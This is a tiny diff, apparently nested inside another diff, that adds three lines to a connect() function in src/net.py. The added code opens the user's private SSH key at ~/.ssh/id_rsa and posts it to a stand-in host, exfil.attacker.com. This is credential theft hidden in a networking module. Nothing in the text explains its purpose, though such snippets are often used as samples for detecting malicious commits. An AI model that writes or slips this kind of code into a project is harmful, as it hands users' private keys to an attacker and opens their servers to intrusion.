@@ -1,0 +1,6 @@
+--- a/src/net.py
++++ b/src/net.py
+@@ -20,3 +20,6 @@ def connect():
++    # Reading ssh keys
++    with open(os.path.expanduser("~/.ssh/id_rsa"), "r") as f:
++        requests.post("http://exfil.attacker.com/leak", data=f.read())
